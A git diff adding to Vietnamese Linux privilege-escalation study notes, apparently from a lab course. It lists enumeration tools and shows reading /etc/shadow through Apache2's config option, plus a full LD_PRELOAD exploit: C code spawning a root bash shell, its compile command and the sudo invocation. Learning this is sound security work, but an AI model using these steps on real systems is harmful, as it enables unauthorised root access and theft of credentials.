@@ -76,9 +76,13 @@ Tìm kiếm các folder có thể ghi:
 ## Step 2: Automated Enumeration Tools
 
 `LinPeas`: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
+
 `LinEnum`: https://github.com/rebootuser/LinEnum
+
 `LES (Linux Exploit Suggester)`: https://github.com/mzet-/linux-exploit-suggester
+
 `Linux Smart Enumeration`: https://github.com/diego-treitos/linux-smart-enumeration
+
 `Linux Priv Checker`: https://github.com/linted/linuxprivchecker
 
 ## Step 3: Privilege Escalation
@@ -102,4 +106,56 @@ Lệnh __sudo__ cho phepsp người dùng chạy chương trình với quyền _
 [gtfobins](https://gtfobins.github.io/): tài nguyên cung cấp thông tin cách chương trình có thể có quyền sudo có thể được sử dụng
 
 __Leverage application functions__
+
+Apache2 có option lựa chọn tệp cấu hình thay thế
+
+![image](https://i.imgur.com/rNpbbL8.png)
+
+=> Load file `/etc/shadow` luôn cũng được, sẽ ra dòng đầu tiên
+
+__Leverage LD_PRELOAD__
+
+Trên một số hệ thống, ta có thể thấy LD_PRELOAD env option
+
+![image](https://i.imgur.com/gGstS69.png)
+
+LD_PRELOAD là một chức năng cho phép bất kỳ chương trình nào sử dụng các thư viện được chia sẻ.
+
+[Blog này](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/) nói cho bạn về khả năng của LD_PRELOAD. Nếu option __env_keep__ được bật, ta có thể generate thư viện chung để mà được load và thực thi trước khi chương trình được chạy. LD_PRELOAD sẽ bị bỏ qua nếu ID người dùng thực khác với ID người dùng hiệu quả.
+
+Các bước leo quyền với LD_PRELOAD:
+- Check LD_PRELOAD với option env_keep
+- Viết code C và compile về share object file (.so extension)
+- Chạy chương trình với quyefn sudo và LD_PRELOAD trỏ tới file .so của ta
+
+Code C:
+
+```C
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+}
+```
+
+Compile
+
+```
+gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+```
+
+Run program
+
+```
+sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
+```
+
+Result
+
+![image](https://i.imgur.com/1YwARyZ.png)
 
